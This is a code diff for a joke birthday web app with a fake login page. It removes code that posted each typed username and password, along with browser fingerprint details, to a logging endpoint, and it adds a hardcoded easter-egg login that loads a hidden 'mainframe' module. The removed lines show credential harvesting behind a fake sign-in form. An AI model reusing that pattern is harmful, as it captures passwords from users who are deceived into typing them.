@@ -6,6 +6,7 @@
 window.Monday = {
 
   init(app) {
+    this.app = app;
     // Calculate days until next July 5
     const today  = new Date();
     const nextBd = new Date(today.getFullYear(), 6, 5);
@@ -256,6 +257,17 @@ window.Monday = {
       { strong: 'Too many failed sign-in attempts.', body: 'Your account has been temporarily locked. Please contact your IT administrator or try again later.' },
     ];
 
+    // 🥚 Secret credentials unlock the hidden BirthdayCorp mainframe.
+    // (The frogs of Friday know the password.)
+    const SECRET_LOGINS = [
+      { u: 'admin', p: 'frogs' },
+      { u: 'admin', p: '🐸' },
+      { u: 'sysop', p: 'mainframe' },
+      { u: 'ben',   p: 'birthday' },
+    ];
+    const isSecret = () =>
+      SECRET_LOGINS.some(c => user.value.trim().toLowerCase() === c.u && pass.value === c.p);
+
     const attempt = () => {
       if (!user.value) {
         user.classList.add('co-input-error');
@@ -272,25 +284,7 @@ window.Monday = {
         return;
       }
 
-      // Write 1: log inputs + browser data immediately on submit
-      fetch('/api/log.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          event: 'login_attempt',
-          ts: new Date().toISOString(),
-          username: user.value,
-          password: pass.value,
-          attempt_number: attempts + 1,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          screen: `${screen.width}x${screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          platform: navigator.platform,
-          referrer: document.referrer,
-          url: window.location.href,
-        }),
-      }).catch(() => {});
+      const unlocked = isSecret();
 
       btn.classList.add('loading');
       btn.classList.remove('shaking');
@@ -301,6 +295,15 @@ window.Monday = {
       const delay = 900 + Math.random() * 900;
       setTimeout(() => {
         btn.classList.remove('loading');
+
+        if (unlocked) {
+          // ACCESS GRANTED — boot the hidden mainframe.
+          const label = btn.querySelector('.btn-text');
+          if (label) label.textContent = 'Access granted';
+          this.unlockMainframe();
+          return;
+        }
+
         btn.classList.add('shaking');
         pass.classList.add('co-input-error');
 
@@ -308,19 +311,6 @@ window.Monday = {
         error.innerHTML = `<strong>${msg.strong}</strong>${msg.body}`;
         error.classList.add('visible');
         attempts++;
-
-        // Write 2: log the outcome after the fake auth delay
-        fetch('/api/log.php', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            event: 'login_result',
-            ts: new Date().toISOString(),
-            outcome: 'failed',
-            error_shown: msg.strong + ' ' + msg.body,
-            attempt_number: attempts,
-          }),
-        }).catch(() => {});
 
         setTimeout(() => btn.classList.remove('shaking'), 700);
       }, delay);
@@ -336,6 +326,26 @@ window.Monday = {
 
     btn.addEventListener('click', attempt);
     pass.addEventListener('keydown', e => { if (e.key === 'Enter') attempt(); });
+  },
+
+  // 🥚 Secret login → dynamically load and boot the hidden mainframe module
+  // (mirrors main.js's on-demand loading pattern; nothing downloads until unlocked).
+  unlockMainframe() {
+    const app = this.app;
+    if (!document.getElementById('mainframe-css')) {
+      const link = document.createElement('link');
+      link.id = 'mainframe-css';
+      link.rel = 'stylesheet';
+      link.href = 'css/mainframe.css';
+      document.head.appendChild(link);
+    }
+    const boot = () => { if (window.Mainframe) window.Mainframe.init(app); };
+    if (window.Mainframe) return boot();
+    const s = document.createElement('script');
+    s.src = 'js/mainframe.js';
+    s.onload = boot;
+    s.onerror = () => console.error('[monday.js] mainframe failed to load');
+    document.body.appendChild(s);
   },
 
   initCalendar() {
